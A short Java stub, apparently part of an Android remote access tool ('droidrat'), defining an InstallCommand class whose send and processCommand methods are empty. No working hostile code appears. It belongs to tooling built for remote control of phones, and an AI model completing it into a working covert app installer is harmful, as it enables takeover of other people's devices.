package com.je_chen.droidrat_je.command;


import com.je_chen.droidrat_je.rat.command.process_super.CommandFather;
import com.je_chen.droidrat_je.rat.command.process_super.CommandProcessInterface;
import com.je_chen.droidrat_je.rat.modules.appinstall.InstallApp;

public class InstallCommand extends CommandFather implements CommandProcessInterface {

    private InstallApp installApp;

    public InstallCommand(){
        installApp = new InstallApp();
    }

    @Override
    public void send(String value) {

    }

    @Override
    public void processCommand(String command) {

    }
}
